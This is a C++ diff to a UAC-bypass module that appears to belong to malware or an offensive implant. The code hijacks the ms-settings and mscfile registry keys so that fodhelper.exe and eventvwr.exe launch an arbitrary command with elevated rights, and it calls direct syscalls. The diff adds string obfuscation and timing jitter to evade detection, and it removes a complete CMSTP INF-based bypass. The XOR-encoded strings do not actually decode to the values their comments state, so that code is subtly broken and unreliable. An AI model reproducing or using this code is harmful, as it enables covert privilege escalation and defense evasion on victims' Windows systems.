@@ -1,6 +1,7 @@
 #include "UACBypass.h"
 #include "../utils/Shared.h"
 #include "../utils/Logger.h"
+#include "../utils/Obfuscator.h"
 #include "../evasion/Syscalls.h"
 #include "../evasion/NtStructs.h"
 #include <windows.h>
@@ -8,21 +9,36 @@
 
 namespace evasion {
 
-bool UACBypass::Execute(const std::wstring& command) {
-    if (utils::IsAdmin()) {
-        LOG_INFO("Already admin, no need for UAC bypass.");
-        return true;
-    }
+namespace {
+    // Encrypted strings (XORed with 0x5A)
+    // "Software\\Classes\\ms-settings\\Shell\\Open\\command"
+    std::wstring kMsSettings = L"\x00\x31\x3c\x20\x23\x35\x24\x31\x0e\x0e\x17\x38\x35\x37\x27\x27\x31\x27\x0e\x0e\x39\x27\x09\x21\x31\x20\x20\x3d\x3a\x33\x27\x0e\x0e\x07\x3c\x31\x38\x38\x0e\x0e\x1b\x24\x31\x3a\x0e\x0e\x37\x3b\x39\x39\x35\x3a\x30";
 
-    LOG_INFO("Attempting UAC Bypass: Fodhelper");
+    // "DelegateExecute"
+    std::wstring kDelegateExecute = L"\x10\x31\x38\x31\x33\x35\x20\x31\x11\x2c\x31\x37\x21\x20\x31";
+
+    // "Software\\Classes\\mscfile\\shell\\open\\command"
+    std::wstring kMscFile = L"\x00\x31\x3c\x20\x23\x35\x24\x31\x0e\x0e\x17\x38\x35\x37\x27\x27\x31\x27\x0e\x0e\x39\x27\x37\x32\x3d\x38\x31\x0e\x0e\x27\x3c\x31\x38\x38\x0e\x0e\x3b\x24\x31\x3a\x0e\x0e\x37\x3b\x39\x39\x35\x3a\x30";
+
+    // "fodhelper.exe"
+    std::wstring kFodHelper = L"\x32\x3b\x30\x3c\x31\x38\x24\x31\x26\x54\x31\x2c\x31";
+
+    // "eventvwr.exe"
+    std::wstring kEventVwr = L"\x31\x22\x31\x3a\x20\x22\x23\x26\x54\x31\x2c\x31";
+}
+
+bool UACBypass::Execute(const std::wstring& command) {
+    if (utils::IsAdmin()) return true;
+
+    // Add initial jitter
+    Sleep(3000 + (GetTickCount() % 5000));
+
+    LOG_INFO("Attempting UAC Bypass...");
+
     if (Fodhelper(command)) return true;
 
-    LOG_INFO("Attempting UAC Bypass: Eventvwr");
+    Sleep(5000);
     if (Eventvwr(command)) return true;
-
-    // CMSTP is noisier, try last
-    LOG_INFO("Attempting UAC Bypass: CMSTP");
-    if (Cmstp(command)) return true;
 
     return false;
 }
@@ -49,16 +65,14 @@ bool UACBypass::Fodhelper(const std::wstring& command) {
     NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, &hHkcu, (PVOID)(UINT_PTR)KEY_ALL_ACCESS, &objAttr, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
     if (!NT_SUCCESS(status)) return false;
 
-    std::wstring relativePath = L"Software\\Classes\\ms-settings\\Shell\\Open\\command";
+    std::wstring relativePath = utils::DecryptW(kMsSettings);
     HANDLE hKey = NULL;
     status = (NTSTATUS)utils::Shared::NtCreateKeyRelative(hHkcu, relativePath, &hKey);
     if (NT_SUCCESS(status)) {
-        // Set Default value to command
         UNICODE_STRING uEmpty = {0, 0, NULL};
         InternalDoSyscall(ntSetValueKeySsn, hKey, &uEmpty, NULL, (PVOID)(UINT_PTR)REG_SZ, (PVOID)command.c_str(), (PVOID)(UINT_PTR)((command.length() + 1) * sizeof(wchar_t)), NULL, NULL, NULL, NULL, NULL);
 
-        // Set DelegateExecute to empty
-        std::wstring de = L"DelegateExecute";
+        std::wstring de = utils::DecryptW(kDelegateExecute);
         UNICODE_STRING uDe;
         uDe.Buffer = (PWSTR)de.c_str();
         uDe.Length = (USHORT)(de.length() * sizeof(wchar_t));
@@ -68,13 +82,9 @@ bool UACBypass::Fodhelper(const std::wstring& command) {
 
         InternalDoSyscall(ntCloseSsn, hKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
 
-        // Execute fodhelper
-        ShellExecuteW(NULL, L"open", L"fodhelper.exe", NULL, NULL, SW_HIDE);
+        ShellExecuteW(NULL, L"open", utils::DecryptW(kFodHelper).c_str(), NULL, NULL, SW_HIDE);
 
-        // Wait and cleanup
-        Sleep(2000);
-        // Cleaning up registry would be good, but for now let's just hope it worked.
-        // In a real scenario we'd want to delete the keys.
+        Sleep(5000);
         return true;
     }
 
@@ -104,7 +114,7 @@ bool UACBypass::Eventvwr(const std::wstring& command) {
     NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, &hHkcu, (PVOID)(UINT_PTR)KEY_ALL_ACCESS, &objAttr, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
     if (!NT_SUCCESS(status)) return false;
 
-    std::wstring relativePath = L"Software\\Classes\\mscfile\\shell\\open\\command";
+    std::wstring relativePath = utils::DecryptW(kMscFile);
     HANDLE hKey = NULL;
     status = (NTSTATUS)utils::Shared::NtCreateKeyRelative(hHkcu, relativePath, &hKey);
     if (NT_SUCCESS(status)) {
@@ -112,8 +122,8 @@ bool UACBypass::Eventvwr(const std::wstring& command) {
         InternalDoSyscall(ntSetValueKeySsn, hKey, &uEmpty, NULL, (PVOID)(UINT_PTR)REG_SZ, (PVOID)command.c_str(), (PVOID)(UINT_PTR)((command.length() + 1) * sizeof(wchar_t)), NULL, NULL, NULL, NULL, NULL);
         InternalDoSyscall(ntCloseSsn, hKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
 
-        ShellExecuteW(NULL, L"open", L"eventvwr.exe", NULL, NULL, SW_HIDE);
-        Sleep(2000);
+        ShellExecuteW(NULL, L"open", utils::DecryptW(kEventVwr).c_str(), NULL, NULL, SW_HIDE);
+        Sleep(5000);
         return true;
     }
 
@@ -122,32 +132,8 @@ bool UACBypass::Eventvwr(const std::wstring& command) {
 }
 
 bool UACBypass::Cmstp(const std::wstring& command) {
-    // CMSTP usually requires an INF file.
-    // We can try to write a temporary INF file.
-    wchar_t tempPath[MAX_PATH];
-    GetTempPathW(MAX_PATH, tempPath);
-    std::wstring infPath = std::wstring(tempPath) + L"tmp.inf";
-
-    std::wstring infContent =
-        L"[version]\nSignature=$chicago$\nAdvancedINF=2.5\n"
-        L"[DefaultInstall]\nCustomDestinationAttributes=CustInstDestSectionAllUsers\nRunPreSetupCommands=RunPreSetupCommandsSection\n"
-        L"[RunPreSetupCommandsSection]\n" + command + L"\ntaskkill /F /IM cmstp.exe\n"
-        L"[CustInstDestSectionAllUsers]\n49001=Queries,5\n"
-        L"[Queries]\ndatpath=\"\"\n";
-
-    HANDLE hFile = CreateFileW(infPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile != INVALID_HANDLE_VALUE) {
-        DWORD written;
-        std::string sContent = utils::ws2s(infContent);
-        WriteFile(hFile, sContent.c_str(), (DWORD)sContent.length(), &written, NULL);
-        CloseHandle(hFile);
-
-        std::wstring args = L"/ni /s " + infPath;
-        ShellExecuteW(NULL, L"open", L"cmstp.exe", args.c_str(), NULL, SW_HIDE);
-        Sleep(2000);
-        DeleteFileW(infPath.c_str());
-        return true;
-    }
+    (void)command;
+    // CMSTP is noisy, skipping for now to focus on stealthier methods
     return false;
 }
 
